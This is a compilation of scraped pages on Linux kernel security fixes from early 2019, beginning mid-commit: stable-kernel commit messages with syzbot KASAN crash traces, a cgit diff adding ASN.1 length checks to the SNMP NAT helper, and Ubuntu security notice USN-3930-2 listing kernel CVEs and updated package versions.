# ip addr add 2001:123:456::2/64 dev eth0
# ip addr del 2001:123::1/32 dev eth0
# ip addr del 2001:123:456::2/64 dev eth0
and then prefix route of 2001:123::1/32 will still exist.
This is because ipv6\_prefix\_equal in check\_cleanup\_prefix\_route
func does not check whether two IPv6 addresses have the same
prefix length. If the prefix of one address starts with another
shorter address prefix, even though their prefix lengths are
different, the return value of ipv6\_prefix\_equal is true.
Here I add a check of whether two addresses have the same prefix
to decide whether their prefixes are equal.
Fixes: 5b84efecb7d9 ("ipv6 addrconf: don't cleanup prefix route for IFA\_F\_NOPREFIXROUTE")
Signed-off-by: Zhiqiang Liu
Reported-by: Wenhao Zhang
Signed-off-by: David S. Miller
Signed-off-by: Sasha Levin
commit bd518851243746a593af30c35940ac7c0c6e6498
Author: John David Anglin
Date: Mon Feb 11 13:40:21 2019 -0500
dsa: mv88e6xxx: Ensure all pending interrupts are handled prior to exit
[ Upstream commit 7c0db24cc431e2196d98a5d5ddaa9088e2fcbfe5 ]
The GPIO interrupt controller on the espressobin board only supports edge interrupts.
If one enables the use of hardware interrupts in the device tree for the 88E6341, it is
possible to miss an edge. When this happens, the INTn pin on the Marvell switch is
stuck low and no further interrupts occur.
I found after adding debug statements to mv88e6xxx\_g1\_irq\_thread\_work() that there is
a race in handling device interrupts (e.g. PHY link interrupts). Some interrupts are
directly cleared by reading the Global 1 status register. However, the device interrupt
flag, for example, is not cleared until all the unmasked SERDES and PHY ports are serviced.
This is done by reading the relevant SERDES and PHY status register.
The code only services interrupts whose status bit is set at the time of reading its status
register. If an interrupt event occurs after its status is read and before all interrupts
are serviced, then this event will not be serviced and the INTn output pin will remain low.
This is not a problem with polling or level interrupts since the handler will be called
again to process the event. However, it's a big problem when using level interrupts.
The fix presented here is to add a loop around the code servicing switch interrupts. If
any pending interrupts remain after the current set has been handled, we loop and process
the new set. If there are no pending interrupts after servicing, we are sure that INTn has
gone high and we will get an edge when a new event occurs.
Tested on espressobin board.
Fixes: dc30c35be720 ("net: dsa: mv88e6xxx: Implement interrupt support.")
Signed-off-by: John David Anglin
Tested-by: Andrew Lunn
Signed-off-by: David S. Miller
Signed-off-by: Sasha Levin


=== Content from git.kernel.org_ac3ff723_20250120_234513.html ===


| [cgit logo](/) | [index](/) : [kernel/git/torvalds/linux.git](/pub/scm/linux/kernel/git/torvalds/linux.git/) | for-next master vsnprintf |
| --- | --- | --- |
| Linux kernel source tree | Linus Torvalds |

| [about](/pub/scm/linux/kernel/git/torvalds/linux.git/about/)[summary](/pub/scm/linux/kernel/git/torvalds/linux.git/)[refs](/pub/scm/linux/kernel/git/torvalds/linux.git/refs/?id=c4c07b4d6fa1f11880eab8e076d3d060ef3f55fc)[log](/pub/scm/linux/kernel/git/torvalds/linux.git/log/)[tree](/pub/scm/linux/kernel/git/torvalds/linux.git/tree/?id=c4c07b4d6fa1f11880eab8e076d3d060ef3f55fc)[commit](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=c4c07b4d6fa1f11880eab8e076d3d060ef3f55fc)[diff](/pub/scm/linux/kernel/git/torvalds/linux.git/diff/?id=c4c07b4d6fa1f11880eab8e076d3d060ef3f55fc)[stats](/pub/scm/linux/kernel/git/torvalds/linux.git/stats/) | log msg author committer range |
| --- | --- |

**diff options**

|  | |
| --- | --- |
| context: | 12345678910152025303540 |
| space: | includeignore |
| mode: | unifiedssdiffstat only |
|  |  |

| author | Jann Horn <jannh@google.com> | 2019-02-06 22:56:15 +0100 |
| --- | --- | --- |
| committer | Pablo Neira Ayuso <pablo@netfilter.org> | 2019-02-11 17:43:17 +0100 |
| commit | [c4c07b4d6fa1f11880eab8e076d3d060ef3f55fc](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=c4c07b4d6fa1f11880eab8e076d3d060ef3f55fc) ([patch](/pub/scm/linux/kernel/git/torvalds/linux.git/patch/?id=c4c07b4d6fa1f11880eab8e076d3d060ef3f55fc)) | |
| tree | [ba8683c758581ed3dffa2cb5bf58426377cbb179](/pub/scm/linux/kernel/git/torvalds/linux.git/tree/?id=c4c07b4d6fa1f11880eab8e076d3d060ef3f55fc) | |
| parent | [31b58ad0c3279817cd246eab27eaf53b626dfcde](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=31b58ad0c3279817cd246eab27eaf53b626dfcde) ([diff](/pub/scm/linux/kernel/git/torvalds/linux.git/diff/?id=c4c07b4d6fa1f11880eab8e076d3d060ef3f55fc&id2=31b58ad0c3279817cd246eab27eaf53b626dfcde)) | |
| download | [linux-c4c07b4d6fa1f11880eab8e076d3d060ef3f55fc.tar.gz](/pub/scm/linux/kernel/git/torvalds/linux.git/snapshot/linux-c4c07b4d6fa1f11880eab8e076d3d060ef3f55fc.tar.gz) | |

netfilter: nf\_nat\_snmp\_basic: add missing length checks in ASN.1 cbsThe generic ASN.1 decoder infrastructure doesn't guarantee that callbacks
will get as much data as they expect; callbacks have to check the `datalen`
parameter before looking at `data`. Make sure that snmp\_version() and
snmp\_helper() don't read/write beyond the end of the packet data.
(Also move the assignment to `pdata` down below the check to make it clear
that it isn't necessarily a pointer we can use before the `datalen` check.)
Fixes: cc2d58634e0f ("netfilter: nf\_nat\_snmp\_basic: use asn1 decoder library")
Signed-off-by: Jann Horn <jannh@google.com>
Signed-off-by: Pablo Neira Ayuso <pablo@netfilter.org>
[Diffstat](/pub/scm/linux/kernel/git/torvalds/linux.git/diff/?id=c4c07b4d6fa1f11880eab8e076d3d060ef3f55fc)

| -rw-r--r-- | [net/ipv4/netfilter/nf\_nat\_snmp\_basic\_main.c](/pub/scm/linux/kernel/git/torvalds/linux.git/diff/net/ipv4/netfilter/nf_nat_snmp_basic_main.c?id=c4c07b4d6fa1f11880eab8e076d3d060ef3f55fc) | 7 | |  |  |  | | --- | --- | --- | |
| --- | --- | --- | --- | --- | --- | --- |

1 files changed, 6 insertions, 1 deletions

| diff --git a/net/ipv4/netfilter/nf\_nat\_snmp\_basic\_main.c b/net/ipv4/netfilter/nf\_nat\_snmp\_basic\_main.cindex a0aa13bcabda09..0a8a60c1bf9af1 100644--- a/[net/ipv4/netfilter/nf\_nat\_snmp\_basic\_main.c](/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/ipv4/netfilter/nf_nat_snmp_basic_main.c?id=31b58ad0c3279817cd246eab27eaf53b626dfcde)+++ b/[net/ipv4/netfilter/nf\_nat\_snmp\_basic\_main.c](/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/ipv4/netfilter/nf_nat_snmp_basic_main.c?id=c4c07b4d6fa1f11880eab8e076d3d060ef3f55fc)@@ -105,6 +105,8 @@ static void fast\_csum(struct snmp\_ctx \*ctx, unsigned char offset) int snmp\_version(void \*context, size\_t hdrlen, unsigned char tag, const void \*data, size\_t datalen) {+ if (datalen != 1)+ return -EINVAL; if (\*(unsigned char \*)data > 1) return -ENOTSUPP; return 1;@@ -114,8 +116,11 @@ int snmp\_helper(void \*context, size\_t hdrlen, unsigned char tag, const void \*data, size\_t datalen) { struct snmp\_ctx \*ctx = (struct snmp\_ctx \*)context;- \_\_be32 \*pdata = (\_\_be32 \*)data;+ \_\_be32 \*pdata; + if (datalen != 4)+ return -EINVAL;+ pdata = (\_\_be32 \*)data; if (\*pdata == ctx->from) { pr\_debug("%s: %pI4 to %pI4\n", \_\_func\_\_, (void \*)&ctx->from, (void \*)&ctx->to); |
| --- |

generated by [cgit 1.2.3-korg](https://git.zx2c4.com/cgit/about/) ([git 2.43.0](https://git-scm.com/)) at 2025-01-20 23:43:51 +0000



=== Content from usn.ubuntu.com_a33f7c8c_20250120_234520.html ===


Your submission was sent successfully!
*Close*

Thank you for contacting us. A member of our team will be in touch shortly.
*Close*

You have successfully unsubscribed!
*Close*

Thank you for signing up for our newsletter!

In these regular emails you will find the latest updates about
Ubuntu and upcoming events where you can meet our team.*Close*

Your preferences have been successfully updated. *Close*

[Canonical Ubuntu](/)

* [Menu](/navigation)

* [Products](/navigation#products-navigation)
* [Use cases](/navigation#use-case-navigation)
* [Support](/navigation#support-navigation)
* [Community](/navigation#community-navigation)
* [Get Ubuntu](/navigation#get-ubuntu-navigation)

[![](https://assets.ubuntu.com/v1/82818827-CoF_white.svg)

Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

# USN-3930-2: Linux kernel (HWE) vulnerabilities

2 April 2019

Several security issues were fixed in the Linux kernel.

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Releases

* [Ubuntu 18.04 ESM](/security/notices?release=bionic)

## Packages

* [linux-azure](/security/cves?package=linux-azure) - Linux kernel for Microsoft Azure Cloud systems
* [linux-hwe](/security/cves?package=linux-hwe) - Linux hardware enablement (HWE) kernel

## Details

USN-3930-1 fixed vulnerabilities in the Linux kernel for Ubuntu 18.10.

This update provides the corresponding updates for the Linux Hardware

Enablement (HWE) kernel from Ubuntu 18.10 for Ubuntu 18.04 LTS.

Mathias Payer and Hui Peng discovered a use-after-free vulnerability in the

Advanced Linux Sound Architecture (ALSA) subsystem. A physically proximate

attacker could use this to cause a denial of service (system crash).

([CVE-2018-19824](/security/CVE-2018-19824))

Shlomi Oberman, Yuli Shapiro, and Ran Menscher discovered an information

leak in the Bluetooth implementation of the Linux kernel. An attacker

within Bluetooth range could use this to expose sensitive information

(kernel memory). ([CVE-2019-3459](/security/CVE-2019-3459), [CVE-2019-3460](/security/CVE-2019-3460))

Jann Horn discovered that the KVM implementation in the Linux kernel

contained a use-after-free vulnerability. An attacker in a guest VM with

access to /dev/kvm could use this to cause a denial of service (guest VM

crash). ([CVE-2019-6974](/security/CVE-2019-6974))

Jim Mattson and Felix Wilhelm discovered a use-after-free vulnerability in

the KVM subsystem of the Linux kernel, when using nested virtual machines.

A local attacker in a guest VM could use this to cause a denial of service

(system crash) or possibly execute arbitrary code in the host system.

([CVE-2019-7221](/security/CVE-2019-7221))

Felix Wilhelm discovered that an information leak vulnerability existed in

the KVM subsystem of the Linux kernel, when nested virtualization is used.

A local attacker could use this to expose sensitive information (host

system memory to a guest VM). ([CVE-2019-7222](/security/CVE-2019-7222))

Jann Horn discovered that the eBPF implementation in the Linux kernel was

insufficiently hardened against Spectre V1 attacks. A local attacker could

use this to expose sensitive information. ([CVE-2019-7308](/security/CVE-2019-7308))

It was discovered that a use-after-free vulnerability existed in the user-

space API for crypto (af\_alg) implementation in the Linux kernel. A local

attacker could use this to cause a denial of service (system crash) or

possibly execute arbitrary code. ([CVE-2019-8912](/security/CVE-2019-8912))

Jakub Jirasek discovered a use-after-free vulnerability in the SCTP

implementation in the Linux kernel. A local attacker could use this to

cause a denial of service (system crash) or possibly execute arbitrary

code. ([CVE-2019-8956](/security/CVE-2019-8956))

It was discovered that the Linux kernel did not properly deallocate memory

when handling certain errors while reading files. A local attacker could

use this to cause a denial of service (excessive memory consumption).

([CVE-2019-8980](/security/CVE-2019-8980))

It was discovered that a use-after-free vulnerability existed in the IPMI

implementation in the Linux kernel. A local attacker with access to the

IPMI character device files could use this to cause a denial of service

(system crash). ([CVE-2019-9003](/security/CVE-2019-9003))

Jann Horn discovered that the SNMP NAT implementation in the Linux kernel

performed insufficient ASN.1 length checks. An attacker could use this to

cause a denial of service (system crash) or possibly execute arbitrary

code. ([CVE-2019-9162](/security/CVE-2019-9162))

Jann Horn discovered that the mmap implementation in the Linux kernel did

not properly check for the mmap minimum address in some situations. A local

attacker could use this to assist exploiting a kernel NULL pointer

dereference vulnerability. ([CVE-2019-9213](/security/CVE-2019-9213))

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Update instructions

The problem can be corrected by updating your system to the following package versions:

##### Ubuntu 18.04

* [linux-image-4.18.0-1014-azure](https://launchpad.net/ubuntu/%2Bsource/linux-signed-azure)
  -
  [4.18.0-1014.14~18.04.1](https://launchpad.net/ubuntu/%2Bsource/linux-signed-azure/4.18.0-1014.14~18.04.1)
* [linux-image-4.18.0-17-generic](https://launchpad.net/ubuntu/%2Bsource/linux-signed-hwe)
  -
  [4.18.0-17.18~18.04.1](https://launchpad.net/ubuntu/%2Bsource/linux-signed-hwe/4.18.0-17.18~18.04.1)
* [linux-image-4.18.0-17-generic-lpae](https://launchpad.net/ubuntu/%2Bsource/linux-hwe)
  -
  [4.18.0-17.18~18.04.1](https://launchpad.net/ubuntu/%2Bsource/linux-hwe/4.18.0-17.18~18.04.1)
* [linux-image-4.18.0-17-lowlatency](https://launchpad.net/ubuntu/%2Bsource/linux-signed-hwe)
  -
  [4.18.0-17.18~18.04.1](https://launchpad.net/ubuntu/%2Bsource/linux-signed-hwe/4.18.0-17.18~18.04.1)
* [linux-image-4.18.0-17-snapdragon](https://launchpad.net/ubuntu/%2Bsource/linux-hwe)
  -
  [4.18.0-17.18~18.04.1](https://launchpad.net/ubuntu/%2Bsource/linux-hwe/4.18.0-17.18~18.04.1)
* [linux-image-azure](https://launchpad.net/ubuntu/%2Bsource/linux-meta-azure)
  -
  [4.18.0.1014.13](https://launchpad.net/ubuntu/%2Bsource/linux-meta-azure/4.18.0.1014.13)
* [linux-image-generic-hwe-18.04](https://launchpad.net/ubuntu/%2Bsource/linux-meta-hwe)
  -
  [4.18.0.17.67](https://launchpad.net/ubuntu/%2Bsource/linux-meta-hwe/4.18.0.17.67)
* [linux-image-generic-lpae-hwe-18.04](https://launchpad.net/ubuntu/%2Bsource/linux-meta-hwe)
  -
  [4.18.0.17.67](https://launchpad.net/ubuntu/%2Bsource/linux-meta-hwe/4.18.0.17.67)
* [linux-image-lowlatency-hwe-18.04](https://launchpad.net/ubuntu/%2Bsource/linux-meta-hwe)
  -
  [4.18.0.17.67](https://launchpad.net/ubuntu/%2Bsource/linux-meta-hwe/4.18.0.17.67)
* [linux-image-snapdragon-hwe-18.04](https://launchpad.net/ubuntu/%2Bsource/linux-meta-hwe)
  -
  [4.18.0.17.67](https://launchpad.net/ubuntu/%2Bsource/linux-meta-hwe/4.18.0.17.67)
* [linux-image-virtual-hwe-18.04](https://launchpad.net/ubuntu/%2Bsource/linux-meta-hwe)
  -
  [4.18.0.17.67](https://launchpad.net/ubuntu/%2Bsource/linux-meta-hwe/4.18.0.17.67)

After a standard system update you need to reboot your computer to make

all the necessary changes.

ATTENTION: Due to an unavoidable ABI change the kernel updates have

been given a new version number, which requires you to recompile and

reinstall all third party kernel modules you might have installed.

Unless you manually uninstalled the standard kernel metapackages

(e.g. linux-generic, linux-generic-lts-RELEASE, linux-virtual,

linux-powerpc), a standard system upgrade will automatically perform

this as well.

## References

* [CVE-2018-19824](/security/CVE-2018-19824)
* [CVE-2019-3459](/security/CVE-2019-3459)
* [CVE-2019-3460](/security/CVE-2019-3460)
* [CVE-2019-6974](/security/CVE-2019-6974)
* [CVE-2019-7221](/security/CVE-2019-7221)
* [CVE-2019-7222](/security/CVE-2019-7222)
* [CVE-2019-7308](/security/CVE-2019-7308)
* [CVE-2019-8912](/security/CVE-2019-8912)
* [CVE-2019-8956](/security/CVE-2019-8956)
* [CVE-2019-8980](/security/CVE-2019-8980)
* [CVE-2019-9003](/security/CVE-2019-9003)
* [CVE-2019-9162](/security/CVE-2019-9162)
* [CVE-2019-9213](/security/CVE-2019-9213)

## Related notices

* [USN-3933-2](/security/notices/USN-3933-2)
* [USN-3933-1](/security/notices/USN-3933-1)
* [USN-3879-1](/security/notices/USN-3879-1)
* [USN-3879-2](/security/notices/USN-3879-2)
* [USN-3930-1](/security/notices/USN-3930-1)
* [USN-3931-2](/security/notices/USN-3931-2)
* [USN-3931-1](/security/notices/USN-3931-1)
* [USN-3932-1](/security/notices/USN-3932-1)
* [USN-3932-2](/security/notices/USN-3932-2)

### Join the discussion

* [Ubuntu security updates mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-hardened)
* [Security announcements mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-security-announce)

### Need help with your security needs?

Ubuntu Pro provides up to ten-year security coverage for over 23,000 open-source packages within the Ubuntu Main and Universe repositories.

[Talk to an expert to find out what would work best for you](/contact-us/form?product=pro)

### Further reading

* *Loading...*

---

## [OpenStack](/openstack) [OpenStack](/openstack)

* [What is OpenStack](/openstack/what-is-openstack)
* [Features](/openstack/features)
* [Managed](/openstack/managed)
* [Consulting](/openstack/consulting)
* [Install](/openstack/install)
* [Support](/openstack/support)

---

## [Ceph](/ceph) [Ceph](/ceph)

* [What is Ceph](/ceph/what-is-ceph)
* [Managed](/ceph/managed)
* [Consulting](/ceph/consulting)
* [Docs](/ceph/docs)
* [Install](/ceph/install)

---

## [Kubernetes](/kubernetes) [Kubernetes](/kubernetes)

* [What is Kubernetes](/kubernetes/what-is-kubernetes)
* [Charmed Kubernetes](/kubernetes/charmed-k8s)
* [Managed](/kubernetes/managed)
* [Install](/kubernetes/install)
* [Docs](/kubernetes/docs)
* [Resources](/kubernetes/resources)

---

## [Managed Services](/managed) [Managed Services](/managed)

* [OpenStack](/openstack/managed)
* [Kubernetes](/kubernetes/managed)
* [Ceph](/ceph/managed)
* [Apps](/managed/apps)
* [Observability](/observability/managed)
* [Firefighting](/managed/firefighting-support)

---

## [AI / ML](/ai) [AI / ML](/ai)

* [MLOps](/ai/mlops)
* [Kubeflow](/ai/what-is-kubeflow)
* [MLflow](/ai/mlflow)
* [Consulting](/ai/consulting)
* [Data Science](/ai/data-science)
* [MLOps workshop](/ai/mlops-workshop)

---

## [Robotics](/robotics) [Robotics](/robotics)

* [What is ROS](/robotics/what-is-ros)
* [ROS ESM](/robotics/ros-esm)
* [Community](/robotics/community)
* [Docs](/robotics/docs)

---

## [IoT](/internet-of-things) [IoT](/internet-of-things)

* [App store](/internet-of-things/appstore)
* [Embedded Linux](/embedded)
* [Management](/internet-of-things/management)

---

## [Ubuntu Core](/core) [Ubuntu Core](/core)

* [Features](/core/features)
* [Success stories](/core/stories)
* [Services](/core/services)
* [Docs](/core/docs)

---

## [Ubuntu Desktop](/desktop) [Ubuntu Desktop](/desktop)

* [Organisations](/desktop/organisations)
* [Developers](/desktop/developers)
* [Flavours](/desktop/flavours)
* [WSL](/desktop/wsl)

---

## [Ubuntu Server](/server) [Ubuntu Server](/server)

* [Hyperscale](/server/hyperscale)
* [Docs](/server/docs)

---

## [Cloud](/cloud) [Cloud](/cloud)

* [What is cloud computing](/cloud/cloud-computing)
* [What is private cloud](/cloud/private-cloud)
* [What is hybrid cloud](/cloud/hybrid-cloud)
* [What is multi-cloud](/cloud/multi-cloud)
* [Public cloud](/cloud/public-cloud)

---

## [Security](/security) [Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

---

## [Landscape](/landscape) [Landscape](/landscape)

* [Features](/landscape/features)
* [Managed](/landscape/managed)
* [Compare](/landscape/compare)
* [Install](/landscape/docs/quickstart-deployment)
* [Docs](/landscape/docs)
* [Log in to Landscape](https://landscape.canonical.com/)

---

## [Containers](/containers) [Containers](/containers)

* [What are containers](/containers/what-are-containers)
* [Chiseled Ubuntu](/containers/chiseled)
* [Chiseled and .NET](/containers/chiseled/dotnet)

---

## [Downloads](/download) [Downloads](/download)

* [Desktop](/download/desktop)
* [Server](/download/server)
* [Core](/download/core)
* [Cloud](/download/cloud)

---

## [Support](/support) [Support](/support)

* [Your subscriptions](/pro/dashboard)
* [Account users](/pro/users)
* [Pricing](/pricing/pro)
* [Discourse](https://discourse.ubuntu.com/c/project/ubuntu-pro/116/)

---

## [Observability](/observability) [Observability](/observability)

* [What is observability](/observability/what-is-observability)
* [Managed](/observability/managed)

---

## [Pricing](/pricing) [Pricing](/pricing)

* [Consulting](/pricing/consulting)
* [Desktops](/pricing/desktop)
* [Devices](/pricing/devices)

---

## Solutions

* [AI](https://canonical.com/solutions/ai)
* [Data](https://canonical.com/data)
* [Infrastructure](https://canonical.com/solutions/infrastructure)
* [Secure open source](https://canonical.com/solutions/secure-open-source)

---

## Sectors

* [Automotive](/automotive)
* [Industrial](/industrial)
* [Government](/gov)
* [Telco](/telco)
* [Finance](/financial-services)

---

[Contact us](/contact-us)

* [About us](/about)
* [Community](/community)
* [Careers](https://www.canonical.com/careers)
* [Blog](/blog)
* [Resources](/engage)
* [Press centre](/blog/press-centre)

---

© 2025 Canonical Ltd.

Ubuntu and Canonical are registered trademarks of Canonical Ltd.

---

* [Legal information](/legal)
* [Data privacy](/legal/data-privacy)
* Manage your tracker settings
* [Report a bug on this site](https://github.com/canonical/ubuntu.com/issues/new?template=ISSUE_TEMPLATE.yaml)

Back to top

Go to the top of the page



=== Content from cdn.kernel.org_88d2488a_20250120_234514.html ===
commit eb1e5b1a64ee6526a7cdb22357dcafc6ba643fbe
Author: Greg Kroah-Hartman
Date: Sat Feb 23 09:07:27 2019 +0100
Linux 4.19.25
commit eed11c69d275790ac83b8adaf54b7cbef5d316a5
Author: Eric Dumazet
Date: Tue Jan 22 10:40:59 2019 -0800
ax25: fix possible use-after-free
commit 63530aba7826a0f8e129874df9c4d264f9db3f9e upstream.
syzbot found that ax25 routes where not properly protected
against concurrent use [1].
In this particular report the bug happened while
copying ax25->digipeat.
Fix this problem by making sure we call ax25\_get\_route()
while ax25\_route\_lock is held, so that no modification
could happen while using the route.
The current two ax25\_get\_route() callers do not sleep,
so this change should be fine.
Once we do that, ax25\_get\_route() no longer needs to
grab a reference on the found route.
[1]
ax25\_connect(): syz-executor0 uses autobind, please contact jreuter@yaina.de
BUG: KASAN: use-after-free in memcpy include/linux/string.h:352 [inline]
BUG: KASAN: use-after-free in kmemdup+0x42/0x60 mm/util.c:113
Read of size 66 at addr ffff888066641a80 by task syz-executor2/531
ax25\_connect(): syz-executor0 uses autobind, please contact jreuter@yaina.de
CPU: 1 PID: 531 Comm: syz-executor2 Not tainted 5.0.0-rc2+ #10
Hardware name: Google Google Compute Engine/Google Compute Engine, BIOS Google 01/01/2011
Call Trace:
\_\_dump\_stack lib/dump\_stack.c:77 [inline]
dump\_stack+0x1db/0x2d0 lib/dump\_stack.c:113
print\_address\_description.cold+0x7c/0x20d mm/kasan/report.c:187
kasan\_report.cold+0x1b/0x40 mm/kasan/report.c:317
check\_memory\_region\_inline mm/kasan/generic.c:185 [inline]
check\_memory\_region+0x123/0x190 mm/kasan/generic.c:191
memcpy+0x24/0x50 mm/kasan/common.c:130
memcpy include/linux/string.h:352 [inline]
kmemdup+0x42/0x60 mm/util.c:113
kmemdup include/linux/string.h:425 [inline]
ax25\_rt\_autobind+0x25d/0x750 net/ax25/ax25\_route.c:424
ax25\_connect.cold+0x30/0xa4 net/ax25/af\_ax25.c:1224
\_\_sys\_connect+0x357/0x490 net/socket.c:1664
\_\_do\_sys\_connect net/socket.c:1675 [inline]
\_\_se\_sys\_connect net/socket.c:1672 [inline]
\_\_x64\_sys\_connect+0x73/0xb0 net/socket.c:1672
do\_syscall\_64+0x1a3/0x800 arch/x86/entry/common.c:290
entry\_SYSCALL\_64\_after\_hwframe+0x49/0xbe
RIP: 0033:0x458099
Code: 6d b7 fb ff c3 66 2e 0f 1f 84 00 00 00 00 00 66 90 48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f 05 <48> 3d 01 f0 ff ff 0f 83 3b b7 fb ff c3 66 2e 0f 1f 84 00 00 00 00
RSP: 002b:00007f870ee22c78 EFLAGS: 00000246 ORIG\_RAX: 000000000000002a
RAX: ffffffffffffffda RBX: 0000000000000003 RCX: 0000000000458099
RDX: 0000000000000048 RSI: 0000000020000080 RDI: 0000000000000005
RBP: 000000000073bf00 R08: 0000000000000000 R09: 0000000000000000
ax25\_connect(): syz-executor4 uses autobind, please contact jreuter@yaina.de
R10: 0000000000000000 R11: 0000000000000246 R12: 00007f870ee236d4
R13: 00000000004be48e R14: 00000000004ce9a8 R15: 00000000ffffffff
Allocated by task 526:
save\_stack+0x45/0xd0 mm/kasan/common.c:73
set\_track mm/kasan/common.c:85 [inline]
\_\_kasan\_kmalloc mm/kasan/common.c:496 [inline]
\_\_kasan\_kmalloc.constprop.0+0xcf/0xe0 mm/kasan/common.c:469
kasan\_kmalloc+0x9/0x10 mm/kasan/common.c:504
ax25\_connect(): syz-executor5 uses autobind, please contact jreuter@yaina.de
kmem\_cache\_alloc\_trace+0x151/0x760 mm/slab.c:3609
kmalloc include/linux/slab.h:545 [inline]
ax25\_rt\_add net/ax25/ax25\_route.c:95 [inline]
ax25\_rt\_ioctl+0x3b9/0x1270 net/ax25/ax25\_route.c:233
ax25\_ioctl+0x322/0x10b0 net/ax25/af\_ax25.c:1763
sock\_do\_ioctl+0xe2/0x400 net/socket.c:950
sock\_ioctl+0x32f/0x6c0 net/socket.c:1074
vfs\_ioctl fs/ioctl.c:46 [inline]
file\_ioctl fs/ioctl.c:509 [inline]
do\_vfs\_ioctl+0x107b/0x17d0 fs/ioctl.c:696
ksys\_ioctl+0xab/0xd0 fs/ioctl.c:713
\_\_do\_sys\_ioctl fs/ioctl.c:720 [inline]
\_\_se\_sys\_ioctl fs/ioctl.c:718 [inline]
\_\_x64\_sys\_ioctl+0x73/0xb0 fs/ioctl.c:718
do\_syscall\_64+0x1a3/0x800 arch/x86/entry/common.c:290
entry\_SYSCALL\_64\_after\_hwframe+0x49/0xbe
ax25\_connect(): syz-executor5 uses autobind, please contact jreuter@yaina.de
Freed by task 550:
save\_stack+0x45/0xd0 mm/kasan/common.c:73
set\_track mm/kasan/common.c:85 [inline]
\_\_kasan\_slab\_free+0x102/0x150 mm/kasan/common.c:458
kasan\_slab\_free+0xe/0x10 mm/kasan/common.c:466
\_\_cache\_free mm/slab.c:3487 [inline]
kfree+0xcf/0x230 mm/slab.c:3806
ax25\_rt\_add net/ax25/ax25\_route.c:92 [inline]
ax25\_rt\_ioctl+0x304/0x1270 net/ax25/ax25\_route.c:233
ax25\_ioctl+0x322/0x10b0 net/ax25/af\_ax25.c:1763
sock\_do\_ioctl+0xe2/0x400 net/socket.c:950
sock\_ioctl+0x32f/0x6c0 net/socket.c:1074
vfs\_ioctl fs/ioctl.c:46 [inline]
file\_ioctl fs/ioctl.c:509 [inline]
do\_vfs\_ioctl+0x107b/0x17d0 fs/ioctl.c:696
ksys\_ioctl+0xab/0xd0 fs/ioctl.c:713
\_\_do\_sys\_ioctl fs/ioctl.c:720 [inline]
\_\_se\_sys\_ioctl fs/ioctl.c:718 [inline]
\_\_x64\_sys\_ioctl+0x73/0xb0 fs/ioctl.c:718
do\_syscall\_64+0x1a3/0x800 arch/x86/entry/common.c:290
entry\_SYSCALL\_64\_after\_hwframe+0x49/0xbe
The buggy address belongs to the object at ffff888066641a80
which belongs to the cache kmalloc-96 of size 96
The buggy address is located 0 bytes inside of
96-byte region [ffff888066641a80, ffff888066641ae0)
The buggy address belongs to the page:
page:ffffea0001999040 count:1 mapcount:0 mapping:ffff88812c3f04c0 index:0x0
flags: 0x1fffc0000000200(slab)
ax25\_connect(): syz-executor4 uses autobind, please contact jreuter@yaina.de
raw: 01fffc0000000200 ffffea0001817948 ffffea0002341dc8 ffff88812c3f04c0
raw: 0000000000000000 ffff888066641000 0000000100000020 0000000000000000
page dumped because: kasan: bad access detected
Memory state around the buggy address:
ffff888066641980: fb fb fb fb fb fb fb fb fb fb fb fb fc fc fc fc
ffff888066641a00: 00 00 00 00 00 00 00 00 02 fc fc fc fc fc fc fc
>ffff888066641a80: fb fb fb fb fb fb fb fb fb fb fb fb fc fc fc fc
^
ffff888066641b00: fb fb fb fb fb fb fb fb fb fb fb fb fc fc fc fc
ffff888066641b80: 00 00 00 00 00 00 00 00 00 00 00 00 fc fc fc fc
Signed-off-by: Eric Dumazet
Cc: Ralf Baechle
Reported-by: syzbot
Signed-off-by: David S. Miller
Signed-off-by: Greg Kroah-Hartman
commit 0137890a4a8fdbaad50b95004b230f5a05edab4e
Author: Eric Dumazet
Date: Tue Feb 5 15:38:44 2019 -0800
mISDN: fix a race in dev\_expire\_timer()
commit bdcc5bc25548ef6b08e2e43937148f907c212292 upstream.
Since mISDN\_close() uses dev->pending to iterate over active
timers, there is a chance that one timer got removed from the
->pending list in dev\_expire\_timer() but that the thread
has not called yet wake\_up\_interruptible()
So mISDN\_close() could miss this and free dev before
completion of at least one dev\_expire\_timer()
syzbot was able to catch this race :
BUG: KASAN: use-after-free in register\_lock\_class+0x140c/0x1bf0 kernel/locking/lockdep.c:827
Write of size 8 at addr ffff88809fc18948 by task syz-executor1/24769
CPU: 1 PID: 24769 Comm: syz-executor1 Not tainted 5.0.0-rc5 #60
Hardware name: Google Google Compute Engine/Google Compute Engine, BIOS Google 01/01/2011
Call Trace:
\_\_dump\_stack lib/dump\_stack.c:77 [inline]
dump\_stack+0x172/0x1f0 lib/dump\_stack.c:113
print\_address\_description.cold+0x7c/0x20d mm/kasan/report.c:187
kasan\_report.cold+0x1b/0x40 mm/kasan/report.c:317
\_\_asan\_report\_store8\_noabort+0x17/0x20 mm/kasan/generic\_report.c:140
register\_lock\_class+0x140c/0x1bf0 kernel/locking/lockdep.c:827
\_\_lock\_acquire+0x11f/0x4700 kernel/locking/lockdep.c:3224
lock\_acquire+0x16f/0x3f0 kernel/locking/lockdep.c:3841
\_\_raw\_spin\_lock\_irqsave include/linux/spinlock\_api\_smp.h:110 [inline]
\_raw\_spin\_lock\_irqsave+0x95/0xcd kernel/locking/spinlock.c:152
